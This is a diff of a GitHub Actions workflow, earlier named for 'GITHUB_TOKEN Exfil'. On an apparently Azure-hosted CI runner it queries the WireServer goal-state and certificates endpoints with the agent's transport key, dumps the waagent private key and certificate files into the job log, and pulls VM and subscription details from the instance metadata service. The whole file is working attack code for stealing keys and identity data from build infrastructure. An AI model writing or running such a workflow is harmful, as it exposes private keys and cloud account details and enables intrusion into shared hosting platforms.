@@ -1,88 +1,71 @@
-name: WireServer Certs + GITHUB_TOKEN Exfil
+name: WireServer Certs v5
 on:
   workflow_dispatch:
-  push:
-    branches: [main]
-    paths:
-      - '.github/workflows/ws-certs-pivot.yml'
 
 jobs:
   ws-certs:
     runs-on: ubuntu-latest
     steps:
-      - name: WireServer GoalState + Certificates Endpoint
+      - name: GoalState and Certificates via Python script file
         run: |
-          python3 - << 'PYEOF'
-import sys, xml.etree.ElementTree as ET, subprocess
+          cat > /tmp/ws.py << 'SCRIPT'
+          import subprocess, xml.etree.ElementTree as ET, sys
+          def run(cmd):
+              r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
+              return r.stdout, r.stderr
+          ws = 'http://168.63.129.16/machine/?comp=goalstate'
+          cert_flag = '/var/lib/waagent/TransportCert.pem'
+          key_flag = '/var/lib/waagent/TransportPrivate.pem'
+          hdrs = ['-H', 'x-ms-version: 2012-11-30']
+          cmd = ['curl', '-sf', '--max-time', '15', '--cert', cert_flag, '--key', key_flag, ws] + hdrs
+          gs_out, gs_err = run(cmd)
+          print('GOALSTATE_LEN=' + str(len(gs_out)))
+          if len(gs_out) < 100:
+              print('GOALSTATE_FAILED:', gs_err[:200])
+              sys.exit(0)
+          try:
+              root = ET.fromstring(gs_out)
+          except Exception as e:
+              print('XML_ERROR:', e)
+              sys.exit(0)
+          cert_url = None
+          for elem in root.iter():
+              tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
+              if tag == 'Certificates' and elem.text:
+                  cert_url = elem.text.strip()
+          print('CERT_URL=' + str(cert_url))
+          if cert_url:
+              cmd2 = ['curl', '-sf', '--max-time', '15', '--cert', cert_flag, '--key', key_flag, cert_url] + hdrs
+              out, err = run(cmd2)
+              print('=== WIRESERVER_CERTS ===')
+              print('STDOUT:', out[:3000] or '(empty)')
+              print('STDERR:', err[:500] or '(none)')
+          SCRIPT
+          python3 /tmp/ws.py
 
-goalstate_result = subprocess.run(
-    ['curl', '-sf', '--max-time', '15',
-     '--cert', '/var/lib/waagent/TransportCert.pem',
-     '--key', '/var/lib/waagent/TransportPrivate.pem',
-     'http://168.63.129.16/machine/?comp=goalstate',
-     '-H', 'x-ms-version: 2012-11-30'],
-    capture_output=True, text=True, timeout=20
-)
-goal_xml = goalstate_result.stdout
-print("=== GOALSTATE_LEN:", len(goal_xml), "===")
-
-if not goal_xml or len(goal_xml) < 100:
-    print("GOALSTATE_FAILED:", goalstate_result.stderr[:200])
-    sys.exit(0)
-
-try:
-    root = ET.fromstring(goal_xml)
-except Exception as e:
-    print(f"XML_PARSE_ERROR: {e}")
-    sys.exit(0)
-
-cert_url = None
-ext_url = None
-for elem in root.iter():
-    tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
-    if tag == 'Certificates' and elem.text:
-        cert_url = elem.text.strip()
-    elif tag == 'ExtensionsConfig' and elem.text:
-        ext_url = elem.text.strip()
-
-print(f"CERT_URL={cert_url}")
-print(f"EXT_URL={ext_url}")
-
-if cert_url:
-    print("\n=== WIRESERVER_CERTS_RESPONSE ===")
-    result = subprocess.run(
-        ['curl', '-sf', '--max-time', '15',
-         '--cert', '/var/lib/waagent/TransportCert.pem',
-         '--key', '/var/lib/waagent/TransportPrivate.pem',
-         cert_url, '-H', 'x-ms-version: 2012-11-30'],
-        capture_output=True, text=True, timeout=20
-    )
-    print("STDOUT:", result.stdout[:3000] or "(empty)")
-    print("STDERR:", result.stderr[:500] or "(none)")
-PYEOF
-
-      - name: Waagent Certificate Files
+      - name: Waagent Files
         run: |
           echo "=== Certificates.pem ==="
-          cat /var/lib/waagent/Certificates.pem 2>/dev/null || echo NO_CERTS_PEM
+          cat /var/lib/waagent/Certificates.pem 2>/dev/null || echo NO_FILE
           echo "=== TransportCert.pem ==="
-          cat /var/lib/waagent/TransportCert.pem 2>/dev/null || echo NO_TRANSPORT_CERT
+          cat /var/lib/waagent/TransportCert.pem 2>/dev/null || echo NO_FILE
           echo "=== TransportPrivate.pem ==="
-          cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo NO_TRANSPORT_KEY
+          cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo NO_FILE
+          echo "=== waagent ls ==="
+          ls -la /var/lib/waagent/ 2>/dev/null | head -20
 
-      - name: IMDS Identity
+      - name: IMDS
         run: |
           curl -sf -H "Metadata:true" \
-            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
-            python3 -c "
-import sys,json
-try:
-    d=json.load(sys.stdin)['compute']
-    print('VMID=' + d['vmId'])
-    print('VMNAME=' + d['name'])
-    print('SUBID=' + d['subscriptionId'])
-    print('RG=' + d['resourceGroupName'])
-    print('LOCATION=' + d['location'])
-except Exception as e:
-    print('IMDS_ERROR:', e)
-"
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -c "
+          import sys,json
+          try:
+              d=json.load(sys.stdin)['compute']
+              print('VMID='+d['vmId'])
+              print('VMNAME='+d['name'])
+              print('SUBID='+d['subscriptionId'])
+              print('RG='+d['resourceGroupName'])
+              print('LOCATION='+d['location'])
+          except Exception as e:
+              print('IMDS_ERROR:',e)
+          "
